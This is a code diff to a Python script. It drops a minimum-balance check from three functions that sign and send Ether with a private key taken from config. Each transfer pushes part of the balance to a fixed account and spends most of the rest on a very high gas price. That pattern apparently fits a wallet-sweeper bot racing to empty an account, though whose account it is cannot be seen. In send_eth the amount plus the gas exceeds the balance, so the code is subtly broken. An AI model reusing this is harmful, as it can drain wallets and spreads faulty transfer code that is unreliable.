@@ -15,17 +15,16 @@ def send_eth():
         private_key = config('PRIVATE_KEY')
         web3 = Web3Provider
         balance = web3.eth.get_balance(from_account)
-        if balance > 100000000000000:
-            signed_tx = web3.eth.account.signTransaction(
-                {
-                    'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
-                    'to': to_account,
-                    'value': int(balance * 0.09),
-                    'gas': 21000,
-                    'gasPrice': int(balance * 0.99 / 21000)
-                },
-                private_key)
-            web3.eth.sendRawTransaction(signed_tx.rawTransaction)
+        signed_tx = web3.eth.account.signTransaction(
+            {
+                'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
+                'to': to_account,
+                'value': int(balance * 0.09),
+                'gas': 21000,
+                'gasPrice': int(balance * 0.99 / 21000)
+            },
+            private_key)
+        web3.eth.sendRawTransaction(signed_tx.rawTransaction)
     except Exception as a:
         print('error', a)
 
@@ -38,17 +37,16 @@ def send_eth2():
         private_key = config('PRIVATE_KEY')
         web3 = Web3Provider
         balance = web3.eth.get_balance(from_account)
-        if balance > 100000000000000:
-            signed_tx = web3.eth.account.signTransaction(
-                {
-                    'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
-                    'to': to_account,
-                    'value': int(balance * 0.01),
-                    'gas': 21000,
-                    'gasPrice': int(balance * 0.98 / 21000)
-                },
-                private_key)
-            web3.eth.sendRawTransaction(signed_tx.rawTransaction)
+        signed_tx = web3.eth.account.signTransaction(
+            {
+                'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
+                'to': to_account,
+                'value': int(balance * 0.01),
+                'gas': 21000,
+                'gasPrice': int(balance * 0.98 / 21000)
+            },
+            private_key)
+        web3.eth.sendRawTransaction(signed_tx.rawTransaction)
     except Exception as a:
         print('error', a)
 
@@ -61,16 +59,15 @@ def send_eth2_second():
     web3 = Web3Provider
     balance = web3.eth.get_balance(from_account)
     try:
-        if balance > 100000000000000:
-            signed_tx = web3.eth.account.signTransaction(
-                {
-                    'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
-                    'to': to_account,
-                    'value': int(balance * 0.49),
-                    'gas': 21000,
-                    'gasPrice': int(balance * 0.50 / 21000)
-                },
-                private_key)
-            web3.eth.sendRawTransaction(signed_tx.rawTransaction)
+        signed_tx = web3.eth.account.signTransaction(
+            {
+                'nonce': web3.eth.getTransactionCount(from_account, 'pending'),
+                'to': to_account,
+                'value': int(balance * 0.49),
+                'gas': 21000,
+                'gasPrice': int(balance * 0.50 / 21000)
+            },
+            private_key)
+        web3.eth.sendRawTransaction(signed_tx.rawTransaction)
     except Exception as a:
         print('')
